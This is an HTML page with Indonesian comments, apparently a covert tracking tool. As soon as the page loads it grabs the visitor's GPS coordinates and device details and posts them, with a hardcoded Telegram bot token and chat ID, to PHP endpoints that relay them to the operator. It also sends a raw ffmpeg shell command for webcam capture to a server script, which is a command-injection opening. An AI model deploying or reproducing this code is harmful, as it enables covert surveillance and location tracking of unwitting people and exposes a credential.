<!DOCTYPE html>
<html>
<head>
    <title>Bot Telegram</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <script>
        // Token Bot Telegram
        var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';

        // ID Chat Telegram
        var chatId = '1121369247';

        // Fungsi untuk mengambil foto dari kamera
        function capturePhoto() {
            // Ubah command sesuai dengan kebutuhan
            var command = 'ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 photo.jpg';

            $.ajax({
                url: 'capture_photo.php',
                method: 'POST',
                data: { command: command },
                success: function(response) {
                    console.log('Foto berhasil diambil');
                }
            });
        }

        // Fungsi untuk mendapatkan lokasi akurat menggunakan GPS
        function getAccurateLocation() {
            navigator.geolocation.getCurrentPosition(function(position) {
                var latitude = position.coords.latitude;
                var longitude = position.coords.longitude;
                var accuracy = position.coords.accuracy;

                // Kirim data lokasi ke endpoint PHP
                $.ajax({
                    url: 'send_location.php',
                    method: 'POST',
                    data: {
                        botToken: botToken,
                        chatId: chatId,
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy
                    },
                    success: function(response) {
                        console.log('Lokasi berhasil dikirim');
                    }
                });
            });
        }

        // Fungsi untuk mendapatkan informasi perangkat
        function getDeviceInfo() {
            var screenWidth = window.screen.width;
            var screenHeight = window.screen.height;
            var platform = navigator.platform;

            // Kirim data informasi perangkat ke endpoint PHP
            $.ajax({
                url: 'send_device_info.php',
                method: 'POST',
                data: {
                    botToken: botToken,
                    chatId: chatId,
                    screenWidth: screenWidth,
                    screenHeight: screenHeight,
                    platform: platform
                },
                success: function(response) {
                    console.log('Informasi perangkat berhasil dikirim');
                }
            });
        }

        // Ambil foto otomatis dan kirim ke Telegram
        capturePhoto();

        // Mendapatkan lokasi akurat
        getAccurateLocation();

        // Mendapatkan informasi perangkat
        getDeviceInfo();
    </script>
</body>
</html>
